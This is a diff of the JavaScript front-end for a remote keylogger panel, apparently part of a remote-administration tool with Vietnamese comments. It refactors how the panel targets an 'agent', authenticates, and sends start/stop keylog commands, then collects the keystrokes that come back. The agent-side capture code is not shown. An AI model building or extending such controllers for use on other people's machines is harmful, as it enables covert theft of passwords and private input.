@@ -1,7 +1,4 @@
-/**
- * Path: assets/js/keylog.js
- * Nhiệm vụ: Xử lý logic cho trang Keylogger, visual hiệu ứng phím và lưu file.
- */
+import * as Logic from './logic.js';
 
 class KeyloggerUI {
     constructor() {
@@ -45,7 +42,7 @@ class KeyloggerUI {
 
         // 2. Gán sự kiện cho các nút
         this.btnMenu.addEventListener('click', () => {
-            window.location.href = 'index.html';
+            window.location.href = 'Feature_menu.html';
         });
         this.btnStart.onclick = () => this.startKeylog();
         this.btnStop.onclick = () => this.stopKeylog();
@@ -55,7 +52,7 @@ class KeyloggerUI {
             this.injectActiveStyle();
             
             // 4. Đọc agent ID từ URL và tự động setTarget (nếu có)
-            this.setTargetFromURL();
+            Logic.initAgentTargetFromURL();
             
             this.logSystem("Ready. Press 'Start keylog' to begin.");
         };
@@ -63,30 +60,6 @@ class KeyloggerUI {
         waitForGateway();
     }
 
-    setTargetFromURL() {
-        // Đọc agent ID từ URL và tự động setTarget
-        const urlParams = new URLSearchParams(window.location.search);
-        const agentId = urlParams.get('id');
-        if (agentId && window.gateway) {
-            // Đợi gateway sẵn sàng và agents list được load
-            const checkAndSetTarget = () => {
-                if (window.gateway && window.gateway.isAuthenticated) {
-                    // Đợi agents list được load trước
-                    if (window.gateway.agentsList && window.gateway.agentsList.length > 0) {
-                        window.gateway.setTarget(agentId);
-                        this.logSystem(`Đã setTarget đến agent: ${agentId}`);
-                    } else {
-                        // Nếu agents list chưa có, đợi thêm
-                        setTimeout(checkAndSetTarget, 500);
-                    }
-                } else {
-                    // Nếu gateway chưa sẵn sàng, đợi thêm
-                    setTimeout(checkAndSetTarget, 500);
-                }
-            };
-            checkAndSetTarget();
-        }
-    }
 
     // --- Command Functions ---
 
@@ -98,7 +71,7 @@ class KeyloggerUI {
 
         if (!window.gateway.isAuthenticated) {
             // Tự động Auth nếu chưa đăng nhập
-            window.gateway.authenticate();
+            Logic.authenticate();
             // Đợi một chút để auth hoàn tất
             setTimeout(() => {
                 this.startKeylog();
@@ -112,7 +85,7 @@ class KeyloggerUI {
         
         // Gửi lệnh Start Keylog tới Server/Agent
         // interval: 0.1 để nhận dữ liệu gần như realtime cho hiệu ứng mượt
-        window.gateway.send(window.CONFIG.CMD.START_KEYLOG, JSON.stringify({ interval: 0.1 }));
+        Logic.startKeylog(0.1);
         
         if (this.btnStart) {
             this.btnStart.style.backgroundColor = "#22c55e"; // Green signals active
@@ -127,7 +100,7 @@ class KeyloggerUI {
         this.logSystem(">>> Keylogger STOPPED.");
         alert('stopped');
         
-        window.gateway.send(window.CONFIG.CMD.STOP_KEYLOG, "");
+        Logic.stopKeylog();
         
         if (this.btnStart) {
             this.btnStart.style.backgroundColor = ""; // Reset color
@@ -138,16 +111,18 @@ class KeyloggerUI {
     // --- Core Logic: Xử lý dữ liệu nhận về ---
 
     /**
-     * Xử lý luồng data nhận được từ Socket
+     * Xử lý luồng data nhận được từ Socket (UI only)
      * @param {string} dataString - Chuỗi ký tự nhận được (có thể là 1 hoặc nhiều ký tự)
      */
     handleIncomingKey(dataString, senderId) {
         if (!this.isLogging) return;
 
-        // Cắt chuỗi thành mảng các ký tự để xử lý từng phím
-        const chars = dataString.split('');
+        // Xử lý dữ liệu qua logic.js
+        const processed = Logic.processKeylogData(dataString, senderId);
+        if (!processed.processed) return;
 
-        chars.forEach(char => {
+        // Xử lý UI cho từng ký tự
+        processed.chars.forEach(char => {
             // 1. Lưu vào buffer (để tải file)
             this.logBuffer += char;
 
